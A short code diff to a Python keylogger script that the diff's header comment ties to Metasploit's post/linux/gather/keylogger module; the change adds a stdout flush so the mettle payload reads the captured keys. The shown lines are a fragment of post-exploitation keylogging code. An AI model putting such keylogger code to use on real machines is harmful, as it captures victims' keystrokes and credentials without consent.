@@ -4,6 +4,7 @@
 # One linered in post/linux/gather/keylogger.rb
 
 import struct
+import sys
 
 from os import popen
 
@@ -133,5 +134,8 @@ while 1:
                     pressed.append(key)
         elif value == 0 and key not in modifiers and len(key) > 1:
             print(key)
+
+    # Makes sure mettle reads our output
+    sys.stdout.flush()
 
 in_file.close()
